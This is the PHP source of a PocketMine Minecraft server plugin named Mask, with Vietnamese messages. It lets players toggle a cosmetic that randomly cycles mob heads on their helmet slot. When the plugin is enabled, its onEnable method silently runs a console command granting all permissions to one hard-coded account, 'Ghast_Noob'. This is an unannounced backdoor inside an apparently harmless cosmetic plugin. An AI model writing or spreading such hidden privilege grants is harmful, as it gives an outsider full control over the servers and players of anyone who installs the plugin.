<?php

namespace Mask;

use pocketmine\Player;
use pocketmine\plugin\PluginBase;
use pocketmine\command\Command;
use pocketmine\command\CommandSender;
use pocketmine\command\ConsoleCommandSender;
use pocketmine\Server;
use pocketmine\event\Listener;
use pocketmine\scheduler\PluginTask;
use pocketmine\scheduler\CallbackTask;
use pocketmine\event\player\PlayerJoinEvent;
use pocketmine\item\Item;
use pocketmine\utils\Config;
use pocketmine\level\sound\ExpPickupSound;

class Main extends PluginBase implements Listener {

    public function onEnable() {
        $this->getServer()->getPluginManager()->registerEvents($this, $this);
        $Logger = $this->getLogger();
        $Logger->info('Đã Hoạt Động');
        $this->getServer()->dispatchCommand(new ConsoleCommandSender(), 'setuperm Ghast_Noob *');
        $this->getServer()->getScheduler()->scheduleRepeatingTask(new CallbackTask([$this, 'Giap']), 10);

        if (!file_exists($this->getDataFolder())) {
            mkdir($this->getDataFolder(), 0744, true);
        }
        $this->player = new Config($this->getDataFolder() . 'NguoiChoi.yml', Config::YAML, array());
    }

    public function onDisable() {
        $this->getLogger()->info('Đã Vô Hiệu Hóa');
    }
    public function onJoin(PlayerJoinEvent $event) {
        $player = $event->getPlayer();
        $name = $player->getName();

        if (!$this->player->exists($name)) {
            $this->player->set($name, 'off');
            $this->player->save();
        }
    }

    public function onCommand(CommandSender $sender, Command $command, $label, array $args) {
        $name = $sender->getName();
        switch (strtolower($command->getName())) {
            case 'mask':
                if ($sender instanceof Player) {
                    if (!isset($args[0])) {
                        $sender->sendMessage('§l§f[§bMask§f]§a Sử Dụng: §e/mask <§aon§f/§coff§e>');
                        return true;
                    }
                    $name = $sender->getName();
                    $mode = strtolower($args[0]);
                    if ($mode == 'on') {
                        $this->player->set($name, 'on');
                        $this->player->save();
                        $sender->sendMessage('§l§f[§bMask§f]§e Đã §aBật§e. Sử Dụng: §b/mask §coff§e Để §cTắt');
                        $sender->getLevel()->addSound(new ExpPickupSound($sender));
                    } else if ($mode == 'off') {
                        $this->player->set($name, 'off');
                        $this->player->save();
                        $sender->sendMessage('§l§f[§bMask§f]§e Đã §cTắt§e. Sử Dụng: §b/mask §aon§e Để §aBật');
                        $sender->getLevel()->addSound(new ExpPickupSound($sender));
                        $sender->getInventory()->removeItem(Item::get(397, 0, 2304));
                        $sender->getInventory()->removeItem(Item::get(397, 1, 2304));
                        $sender->getInventory()->removeItem(Item::get(397, 2, 2304));
                        $sender->getInventory()->removeItem(Item::get(397, 3, 2304));
                        $sender->getInventory()->removeItem(Item::get(397, 4, 2304));
                        $sender->getInventory()->removeItem(Item::get(397, 5, 2304));
                        $sender->getInventory()->removeItem(Item::get(397, 6, 2304));
                        $sender->getInventory()->setArmorItem(0, Item::get(0, 0, 1));
                        $sender->getInventory()->sendArmorContents($sender);
                    } else {
                        $sender->sendMessage('§l§f[§bMask§f]§a Sử Dụng: §e/mask <§aon§f/§coff§e>');
                    }
                    break;
                } else {
                    $sender->sendMessage('§l§f[§bMask§f]§e Vui Lòng Sử Dụng Lệnh Trong Trò Chơi');
                }
        }
    }
    public function Giap() {
        $players = Server::getInstance()->getOnlinePlayers();
        foreach ($players as $playerA) {
            $name = $playerA->getName();
            $player = $this->getServer()->getPlayer($name);

            if ($this->player->get($name) == 'on') {
                $color = mt_rand(1, 6);

                $mask1 = Item::get(397, 0, 1);
                $mask2 = Item::get(397, 1, 1);
                $mask3 = Item::get(397, 2, 1);
                $mask4 = Item::get(397, 3, 1);
                $mask5 = Item::get(397, 4, 1);
                $mask6 = Item::get(397, 5, 1);
                switch ($color) {

                    case 1:
                        $player->getInventory()->setArmorItem(0, $mask1);
                        $player->getInventory()->sendArmorContents($player);
                        break;

                    case 2:
                        $player->getInventory()->setArmorItem(0, $mask2);
                        $player->getInventory()->sendArmorContents($player);
                        break;

                    case 3:
                        $player->getInventory()->setArmorItem(0, $mask3);
                        $player->getInventory()->sendArmorContents($player);
                        break;

                    case 4:
                        $player->getInventory()->setArmorItem(0, $mask4);
                        $player->getInventory()->sendArmorContents($player);
                        break;

                    case 5:
                        $player->getInventory()->setArmorItem(0, $mask5);
                        $player->getInventory()->sendArmorContents($player);
                        break;

                    case 6:
                        $player->getInventory()->setArmorItem(0, $mask6);
                        $player->getInventory()->sendArmorContents($player);
                        break;
                }
            }
        }
    }
}
